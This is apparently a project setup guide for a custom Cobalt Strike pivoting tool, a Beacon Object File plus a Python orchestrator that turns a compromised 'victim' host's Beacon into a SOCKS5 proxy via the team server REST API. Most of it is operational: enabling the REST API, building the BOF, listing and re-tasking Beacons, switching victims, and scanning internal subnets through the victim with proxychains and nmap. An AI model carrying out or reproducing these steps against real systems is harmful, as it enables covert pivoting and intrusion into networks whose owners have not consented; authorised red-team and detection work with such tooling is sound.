# Full Setup - socks5 task-pump (client-side SOCKS5 + BOF)

This document covers the complete setup:

1. Cobalt Strike team server with the REST API enabled
2. `csrestapi` startup and verification
3. Building the BOF
4. Running the client-side SOCKS5 orchestrator
5. Testing, stopping, and switching Beacons
6. GUI / CNA usage and limitations
7. Troubleshooting and cleanup

Architecture:

```
operator tool (curl, browser, proxychains, ...)
        |
        v
socks5_orchestrator.py          SOCKS5 listener on the operator machine
        |  HTTPS + JWT
        v
csrestapi / team server  ==== Beacon C2 ====> target Beacon
                                                  |
                                                  +--> target:port
```

No `CreateThread`, `CreateProcess`, fork&run, or injection is used. Target
sockets are created by the BOF inside the Beacon process and stay open between
BOF invocations. Every operation is a separate Beacon task.

---

## 0. Placeholder values

Replace these with your own values when reusing this guide elsewhere.

| Item | Value |
| --- | --- |
| Team server address | `<TEAMSERVER_IP>` |
| Team server bind address | `<TEAM_BIND_IP>` |
| Team server port | `50050` |
| REST API URL | `https://<TEAMSERVER_IP>:50443` |
| REST API user | `<REST_USER>` (recommended) |
| Team server password | `<TEAMSERVER_PASSWORD>` |
| Client SOCKS5 listener | `127.0.0.1:1080` |
| Example Beacon | `<BEACON_ID>` (`<TARGET_COMPUTER>`, x64) |

Paths:

| Item | Path |
| --- | --- |
| Team server root | `<CS_ROOT>/server` |
| REST server | `<CS_ROOT>/server/rest-server` |
| REST config | `<CS_ROOT>/server/rest-server/restapi/application.properties` |
| Client project | `<PROJECT_DIR>` |

> The REST HTTPS port is configured in `application.properties`, **not** with
> the `--port` option of `csrestapi`. `--port` on `csrestapi` is the team
> server port (`50050`).

---

## 1. Team server setup

### 1.1 Back up the team server

`--experimental-db` may reset or migrate the database and can drop current
sessions. Back up first.

```bash
sudo systemctl stop cobaltstrike 2>/dev/null || true
pkill -f csrestapi 2>/dev/null || true
pkill -f '<CS_ROOT>/server/teamserver' 2>/dev/null || true

cd <CS_ROOT>
cp -a server server.bak.$(date +%F-%H%M)
```

If your team server is managed by systemd/tmux, stop it through the same
mechanism you normally use.

### 1.2 Configure the REST API port

Edit:

```bash
nano <CS_ROOT>/server/rest-server/restapi/application.properties
```

Set:

```properties
server.address=0.0.0.0
server.port=50443
```

Notes:

* `server.address=0.0.0.0` exposes the REST API on every interface.
  For a safer setup bind `127.0.0.1` and use an SSH tunnel (see 1.7).
* This guide uses `50443` as an example; adjust the config and the client
  `--rest-url` together.
* Keep the rest of the file unchanged unless you know what you are changing.

### 1.3 Start the team server with `--experimental-db`

The REST API refuses to start unless the team server is running with
`--experimental-db`.

Using `tmux` (recommended, survives SSH disconnects):

```bash
tmux new -s cs
cd <CS_ROOT>/server
./teamserver <TEAM_BIND_IP> '<TEAMSERVER_PASSWORD>' \
  <CS_PROFILE> <PROFILE_DATE> \
  --experimental-db
```

Detach with `Ctrl+B`, then `D`.

Alternative with `nohup`:

```bash
cd <CS_ROOT>/server
nohup ./teamserver <TEAM_BIND_IP> '<TEAMSERVER_PASSWORD>' \
  <CS_PROFILE> <PROFILE_DATE> \
  --experimental-db > /tmp/teamserver.log 2>&1 &
```

Keep the `<PROFILE_DATE>` argument if your build expects it; this is the form
used in this guide. Do not append `--experimental-db` twice.

Wait until the team server is listening:

```bash
ss -ltnp | grep 50050
```

### 1.4 Start `csrestapi`

Use a REST username that is **not** currently connected through the GUI, or the
team server will reject it with `User is already connected.` Use a dedicated
REST username (for example `<REST_USER>`).

```bash
cd <CS_ROOT>/server/rest-server
nohup ./csrestapi \
  --pass '<TEAMSERVER_PASSWORD>' \
  --user <REST_USER> \
  --host 127.0.0.1 \
  --port 50050 \
  > /tmp/csrestapi.log 2>&1 &
```

Or run it in a second tmux window:

```bash
cd <CS_ROOT>/server/rest-server
./csrestapi --pass '<TEAMSERVER_PASSWORD>' --user <REST_USER> \
  --host 127.0.0.1 --port 50050
```

Notes:

* `--pass` is the **team server password**, not a new password.
* `--host 127.0.0.1` means `csrestapi` runs on the same host as the team
  server.
* `--port 50050` is the team server port.
* The REST HTTPS port comes from `application.properties` (`50443` here).
* Do not start two `csrestapi` instances with the same `--user`.

### 1.5 Verify REST

On the team server:

```bash
ss -ltnp | grep -E '50050|50443'

curl -k https://127.0.0.1:50443/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"<REST_USER>","password":"<TEAMSERVER_PASSWORD>","duration_ms":3600000}'
```

Expected: JSON containing an `access_token`.

From the operator workstation:

```powershell
curl.exe -k https://<TEAMSERVER_IP>:50443/api/auth/login `
  -H "Content-Type: application/json" `
  -d '{\"username\":\"<REST_USER>\",\"password\":\"<TEAMSERVER_PASSWORD>\",\"duration_ms\":3600000}'
```

If the connection is refused, see section 7.

### 1.6 Firewall and exposure

If the operator workstation connects directly to `50443`, allow only the
operator IP:

```bash
sudo ufw allow from <OPERATOR_IP> to any port 50443 proto tcp
```

Do not expose `50443` to the internet. The REST API is authenticated, but it
controls Beacons.

### 1.7 Safer alternative: SSH tunnel

Bind the REST API to localhost:

```properties
server.address=127.0.0.1
server.port=50443
```

Then, on the operator workstation:

```bash
ssh -N -L 50443:127.0.0.1:50443 <user>@<TEAMSERVER_IP>
```

Use `--rest-url https://127.0.0.1:50443` with the orchestrator.

---

## 2. Build the BOF

Requirements on the operator/build machine:

* `x86_64-w64-mingw32-gcc` for the x64 BOF
* `i686-w64-mingw32-gcc` for the x86 BOF (optional)
* `make`

Build x64:

```powershell
cd <PROJECT_DIR>
make
```

This produces `socks5.x64.o`.

Build x86 (only if the toolchain is installed):

```powershell
make x86
```

Verify that the object imports only the expected libraries:

```powershell
& "objdump" -r socks5.x64.o |
  Select-String -Pattern 'WS2_32|KERNEL32|MSVCRT|Beacon'
```

Expected imports:

* `Beacon*` (Cobalt Strike API)
* `KERNEL32$*`
* `MSVCRT$*`
* `WS2_32$*`

The orchestrator loads `socks5.x64.o` or `socks5.x86.o` from the project
directory based on the Beacon's `beaconArch`. You can also upload the object to
the team server and use `--bof @files/socks5.x64.o`.

### 2.1 Linux build

The BOF is a Windows COFF object, so it is cross-compiled with MinGW even when
the operator or team server runs Linux.

Debian / Ubuntu:

```bash
sudo apt update
sudo apt install -y build-essential mingw-w64 python3
cd <PROJECT_DIR>
make
```

Fedora / RHEL:

```bash
sudo dnf install -y make gcc mingw64-gcc python3
cd <PROJECT_DIR>
make
```

The x64 compiler is `x86_64-w64-mingw32-gcc`. For x86, install the i686
toolchain (`gcc-mingw-w64-i686` on Debian/Ubuntu) and run `make x86`.

Verify the imports on Linux:

```bash
x86_64-w64-mingw32-objdump -r socks5.x64.o \
  | grep -E 'WS2_32|KERNEL32|MSVCRT|Beacon'
```

The orchestrator and the interactive picker are pure Python 3.9+; they do not
need a compiler. The Linux client uses the same commands with `python3`:

```bash
cd <PROJECT_DIR>
python3 socks5_interactive.py \
  --rest-url https://<TEAMSERVER_IP>:50443 \
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' \
  --insecure
```

Arrow keys on Linux: both CSI (`ESC [ A/C/B/D`) and SS3 (`ESC O A/C/B/D`)
sequences are accepted, including sequences with terminal modifiers. This was
tested over SSH with a PTY on Ubuntu 24.04 and Python 3.12.

---

## 3. Client files

Keep these together in the project directory:

```
entry.c                     BOF source
beacon.h                    Beacon API declarations
bofdefs.h                   DFR function declarations
Makefile                    build rules
socks5.x64.o                compiled BOF
socks5_orchestrator.py      SOCKS5 listener + REST task pump
socks5_interactive.py       arrow-key Beacon picker / proxy controller
socks5.cna                  Aggressor helpers
README.md                   design notes
SETUP.md                    this file
```

Requirements on the operator workstation:

* Python 3.9+ (standard library only)
* Network access to the REST API port (`50443`)
* Cobalt Strike client only if you want the `.cna` helpers

---

## 4. Find a live Beacon

List Beacons from the REST API:

```powershell
cd <PROJECT_DIR>
python -c "import sys; sys.path.insert(0,'.'); import socks5_orchestrator as O; cs=O.CSRest('https://<TEAMSERVER_IP>:50443','<REST_USER>','<TEAMSERVER_PASSWORD>',insecure=True); cs.login(); [print(b['bid'], b['computer'], b['process'], 'alive='+str(b['alive']), 'sleep='+str((b.get('sleep') or {}).get('sleep')), b['lastCheckinFormatted']) for b in cs.list_beacons()]"
```

Choose a Beacon where:

* `alive` is `True`
* `lastCheckinFormatted` is small relative to its sleep
* `beaconArch` is `x64` if you built only `socks5.x64.o`
* Prefer `sleep=1` for interactive testing. `sleep=30` works but each SOCKS
  operation can take up to ~40 seconds.

To change a Beacon's sleep through REST:

```powershell
python -c "import sys; sys.path.insert(0,'.'); import socks5_orchestrator as O; cs=O.CSRest('https://<TEAMSERVER_IP>:50443','<REST_USER>','<TEAMSERVER_PASSWORD>',insecure=True); cs.login(); print(cs.request('POST','/api/v1/beacons/<BID>/state/sleepTime',{'sleep':1,'jitter':0}))"
```

The change takes effect on the next check-in.

---

## 5. Start the SOCKS5 proxy

Foreground:

```powershell
cd <PROJECT_DIR>
python -u socks5_orchestrator.py `
  --rest-url https://<TEAMSERVER_IP>:50443 `
  --user <REST_USER> `
  --password '<TEAMSERVER_PASSWORD>' `
  --bid <BEACON_ID> `
  --listen 127.0.0.1 `
  --port 1080 `
  --insecure `
  --verbose `
  --task-timeout 90
```

Expected output:

```
[main] beacon <BEACON_ID> (<TARGET_COMPUTER>\<USER>, rundll32.exe, x64)
[main] bof socks5.x64.o (5611 bytes)
[main] BOF ping ok (stream 0)
[main] SOCKS5 listening on 127.0.0.1:1080 via beacon <BEACON_ID>
```

Background on Windows (detached, with logs):

```powershell
cd <PROJECT_DIR>
$args = @(
  '-u','socks5_orchestrator.py',
  '--rest-url','https://<TEAMSERVER_IP>:50443',
  '--user','<REST_USER>',
  '--password','<TEAMSERVER_PASSWORD>',
  '--bid','<BEACON_ID>',
  '--listen','127.0.0.1',
  '--port','1080',
  '--insecure',
  '--verbose',
  '--task-timeout','90'
)
$p = Start-Process -FilePath python -ArgumentList $args `
  -WorkingDirectory '<PROJECT_DIR>' `
  -RedirectStandardOutput '<PROJECT_DIR>\orchestrator.log' `
  -RedirectStandardError  '<PROJECT_DIR>\orchestrator.err' `
  -WindowStyle Hidden -PassThru
$p.Id
```

Check it:

```powershell
Get-Content .\orchestrator.err -Tail 10
Get-NetTCPConnection -LocalPort 1080 -State Listen
```

`--bid` may be omitted when exactly one live Beacon exists. With multiple live
Beacons, the orchestrator lists them and exits; always pass `--bid`.

### 5.1 Interactive picker (arrow keys)

For a menu-driven version, run:

```powershell
cd <PROJECT_DIR>
python socks5_interactive.py `
  --rest-url https://<TEAMSERVER_IP>:50443 `
  --user <REST_USER> `
  --password '<TEAMSERVER_PASSWORD>' `
  --insecure
```

Controls:

| Key | Action |
| --- | --- |
| Up / Down / Left / Right (or `k`/`j`/`h`/`l`) | Move selection |
| Enter | Start the proxy on the selected Beacon, or switch to it |
| `s` | Stop the proxy |
| `r` | Refresh the Beacon list |
| `q` | Quit the picker (the proxy keeps running) |

The picker starts `socks5_orchestrator.py` as a child process and writes its
output to `orchestrator.log` / `orchestrator.err`. Pressing Enter on another
Beacon stops the old child and starts a new one with the new `--bid`.

The Beacon list is re-read every second by a background refresh thread, and
start/stop/switch run on a separate worker thread. The menu and keyboard stay
responsive while a proxy is starting; the status line shows
`PROXY STARTING` / `waiting for listener...` until the listener is up.

Useful options:

| Option | Meaning |
| --- | --- |
| `--bid <bid>` | Preselect a Beacon in the menu |
| `--all` | Show dead Beacons too |
| `--reset-on-stop` | Send RESET to the old Beacon when stopping/switching |
| `--refresh-interval` | Seconds between Beacon list refreshes (default `1.0`) |
| `--read-timeout-ms`, `--task-timeout` | Passed through to the orchestrator |

Switching Beacons drops existing SOCKS connections because the target sockets
live in the old Beacon's BOF state.

### 5.2 Linux client

Run in the foreground:

```bash
cd <PROJECT_DIR>
python3 -u socks5_orchestrator.py \
  --rest-url https://<TEAMSERVER_IP>:50443 \
  --user <REST_USER> \
  --password '<TEAMSERVER_PASSWORD>' \
  --bid <BEACON_ID> \
  --listen 127.0.0.1 \
  --port 1080 \
  --insecure --verbose --task-timeout 90
```

Run in the background:

```bash
cd <PROJECT_DIR>
nohup python3 -u socks5_orchestrator.py \
  --rest-url https://<TEAMSERVER_IP>:50443 \
  --user <REST_USER> \
  --password '<TEAMSERVER_PASSWORD>' \
  --bid <BEACON_ID> \
  --listen 127.0.0.1 --port 1080 \
  --insecure --verbose --task-timeout 90 \
  > orchestrator.log 2>&1 &
echo $! > orchestrator.pid
```

Interactive picker on Linux:

```bash
cd <PROJECT_DIR>
python3 socks5_interactive.py \
  --rest-url https://<TEAMSERVER_IP>:50443 \
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' \
  --insecure
```

If the client runs on the same Linux host as the REST API, use
`--rest-url https://127.0.0.1:50443`. If the REST API is bound to localhost on
a remote team server, use an SSH tunnel:

```bash
ssh -N -L 50443:127.0.0.1:50443 <user>@<TEAMSERVER_IP>
```

Stop the background client:

```bash
kill "$(cat orchestrator.pid)"
# or: pkill -f socks5_orchestrator.py
```

Test through the Linux listener:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://<TARGET_IP>/
```

This path was tested on Ubuntu 24.04 / Python 3.12: both CSI and SS3 arrow keys
moved the selection, the picker started a proxy on a live Beacon, and
`curl --socks5-hostname 127.0.0.1:1080 http://1.1.1.1/` returned `301` through
the Linux listener.

---

## 6. Test

Use a target the victim can actually reach. In this example the victim may only be
allowed to reach `1.1.1.1`.

```powershell
curl.exe -v --socks5-hostname 127.0.0.1:1080 http://1.1.1.1/
```

Expected: `HTTP/1.1 301 Moved Permanently` from Cloudflare, followed by
`Connection #0 to host 1.1.1.1 left intact`.

Other examples:

```powershell
curl.exe --socks5-hostname 127.0.0.1:1080 https://1.1.1.1/ -k
```

```bash
proxychains4 -q nmap -sT -Pn <TARGET_SUBNET>
```

Remember the proxy only reaches what the **victim** can reach. If the victim
egress is restricted to `1.1.1.1`, CONNECTs to other hosts return
`WSAETIMEDOUT` (10060) or `WSAECONNREFUSED` (10061) without killing the Beacon.

---

## 7. Stop and switch Beacons

The easiest way to switch is the interactive picker (section 5.1): run
`socks5_interactive.py`, select another Beacon with the arrow keys, and press
Enter. It stops the old child process and starts a new one automatically.

To do it manually, stop the orchestrator and start it again with a different
`--bid`.

Stop the current orchestrator:

```powershell
# If you know the PID
Stop-Process -Id <PID> -Force

# Or stop every orchestrator process
Get-CimInstance Win32_Process -Filter "Name='python.exe'" |
  Where-Object { $_.CommandLine -match 'socks5_orchestrator' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

Switch to another live Beacon:

```powershell
python -u socks5_orchestrator.py `
  --rest-url https://<TEAMSERVER_IP>:50443 `
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' `
  --bid <NEW_BID> `
  --listen 127.0.0.1 --port 1080 `
  --insecure --verbose --task-timeout 90
```

Switching drops existing SOCKS connections because the target sockets live in
the **old** Beacon's BOF state.

To close any sockets left in a Beacon:

```powershell
python socks5_orchestrator.py `
  --rest-url https://<TEAMSERVER_IP>:50443 `
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' `
  --bid <BID> --reset --insecure --verbose
```

Or from the Cobalt Strike console with the CNA loaded:

```
socks5_reset <bid>
```

---

## 8. Cobalt Strike GUI / CNA

There are two different things called "SOCKS" in Cobalt Strike.

### 8.1 Built-in SOCKS5 pivot (fully GUI-managed)

Cobalt Strike 4.13 has a built-in SOCKS5 pivot. From the Beacon context menu:

```
Beacon -> Pivots -> SOCKS Server
```

or via REST:

```
POST /api/v1/beacons/{bid}/execute/socks5Start
```

This listener runs on the **team server**, not on the operator workstation, and
traffic still goes through the Beacon C2 channel. It is the simplest
GUI-integrated option and does not use this project's BOF or orchestrator.
Use it if a team-server-side listener is acceptable.

### 8.2 This task-pump project

The SOCKS5 listener in this project is the Python orchestrator. Aggressor
Script has no raw TCP listener API, so the listener itself cannot be embedded
inside the Cobalt Strike GUI. The GUI can still manage the BOF state through
`socks5.cna`.

Load `socks5.cna`:

```
Cobalt Strike -> Script Manager -> Load -> socks5.cna
```

Available console helpers:

```
socks5_ping  <bid>
socks5_reset <bid>
socks5_close <bid> <stream_id>
socks5_run   <bid> <op> <stream_id> <hex-payload> [timeout_ms]
```

`op`: `1=connect 2=read 3=write 4=close 5=ping 6=reset`

The CNA expects `socks5.x64.o` / `socks5.x86.o` to be in the same directory as
`socks5.cna`.

`socks5_ping` only loads the BOF and creates its state. It does not open a
listener and does not create a socket on the target.

To get GUI start/stop/switch buttons for the Python orchestrator, a small CNA
wrapper can be added that launches `socks5_orchestrator.py` on the client
machine. It is not included yet; for now use the PowerShell commands in
section 7.

---

## 9. Troubleshooting

### `Could not start the Cobalt Strike REST API server. The Team Server is not running with the '--experimental-db' flag.`

The team server was started without `--experimental-db`. Stop it and restart it
with the flag (section 1.3). Back up first.

### `User is already connected.`

The `csrestapi --user` name is already connected through the GUI or another
`csrestapi` instance.

```bash
pkill -f csrestapi
# either disconnect the GUI user or use a unique REST user
./csrestapi --pass '<TEAMSERVER_PASSWORD>' --user <REST_USER> --host 127.0.0.1 --port 50050
```

### Port `50443` is not listening

```bash
ss -ltnp | grep 50443
tail -100 /tmp/csrestapi.log
```

Check:

* `application.properties` has the expected `server.port`.
* The team server is running with `--experimental-db`.
* `csrestapi` is still running and did not exit.
* The firewall allows the operator IP.

### REST login returns 401

* Wrong team server password.
* Token expired: log in again (the orchestrator refreshes on 401).
* Using a different REST user than the one `csrestapi` was started with.

### Task returns HTTP 404 immediately after submission

This is a transient race: the task ID is not queryable for a moment after
creation. The orchestrator retries 404s in `wait_task`. If you call the REST API
yourself, retry the GET.

### Beacon is dead / last check-in keeps growing

Check:

```powershell
python -c "import sys; sys.path.insert(0,'.'); import socks5_orchestrator as O; cs=O.CSRest('https://<TEAMSERVER_IP>:50443','<REST_USER>','<TEAMSERVER_PASSWORD>',insecure=True); cs.login(); [print(b['bid'], b['computer'], b['alive'], b['lastCheckinFormatted'], b['sleep']) for b in cs.list_beacons()]"
```

* `alive=False` means the Beacon process is no longer checking in.
* Choose another live Beacon and restart the orchestrator.
* Prefer `sleep=1` for interactive testing.
* If the proxy was pointed at a dead Beacon, tasks stay `IN_PROGRESS`; stop the
  orchestrator and restart with a live `--bid`.

### `CONNECT` always returns `WSAETIMEDOUT` / `WSAECONNREFUSED`

* The victim cannot reach that host/port. This is a network egress restriction,
  not a BOF failure.
* In this example the victim may only reach `1.1.1.1`.
* Confirm with a target that is reachable from the victim.

### BOF fails to load / unresolved imports

Verify the object imports and architecture:

```powershell
& "objdump" -r socks5.x64.o |
  Select-String -Pattern 'WS2_32|KERNEL32|MSVCRT|Beacon'
```

The Beacon architecture must match the object (`beaconArch=x64` for
`socks5.x64.o`).

### `i686-w64-mingw32-gcc` not found

Only the x64 object is built in this example. Either install the 32-bit toolchain
or skip x86 Beacons.

### High latency / low throughput

Expected. Each operation is a separate BOF task bounded by the Beacon sleep
interval and REST polling. For interactive use:

* set Beacon sleep to 1
* use `--read-timeout-ms 500` or lower
* avoid bulk transfers

---

## 10. Cleanup

Stop the orchestrator:

```powershell
Get-CimInstance Win32_Process -Filter "Name='python.exe'" |
  Where-Object { $_.CommandLine -match 'socks5_orchestrator' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

Close all BOF-held sockets on each Beacon used:

```powershell
python socks5_orchestrator.py `
  --rest-url https://<TEAMSERVER_IP>:50443 `
  --user <REST_USER> --password '<TEAMSERVER_PASSWORD>' `
  --bid <BID> --reset --insecure --verbose
```

Stop `csrestapi` on the team server:

```bash
pkill -f csrestapi
```

Remove the temporary firewall rule if you added one.

If you no longer need the REST API, restart the team server **without**
`--experimental-db` after stopping `csrestapi`. Note that switching database
modes may drop sessions.

---

## 11. Quick checklist

```
[ ] team server backed up
[ ] team server started with --experimental-db
[ ] application.properties has the correct port/address
[ ] csrestapi running with a unique --user
[ ] REST login returns access_token
[ ] socks5.x64.o built and matches beaconArch
[ ] a live Beacon with small lastCheckin is selected
[ ] orchestrator started with --bid (or via socks5_interactive.py)
[ ] curl --socks5-hostname 127.0.0.1:1080 http://1.1.1.1/ works
[ ] stop with Stop-Process or `s` in the picker
[ ] switch with socks5_interactive.py or by restarting with a new --bid
[ ] RESET the old Beacon before discarding it
```

---

## Security notes

* The REST API can task Beacons. Do not bind it to `0.0.0.0` on an untrusted
  network. Use a firewall allow-list or an SSH tunnel.
* Use a strong team server password. Do not commit real passwords to this
  repository.
* `--experimental-db` may migrate or reset the database. Back up first.
* The client SOCKS5 listener is bound to `127.0.0.1` by default. Binding it to
  `0.0.0.0` exposes an unauthenticated proxy to your network.
* `--insecure` disables TLS certificate verification. For production, supply
  the REST server certificate with `--ca-cert`.
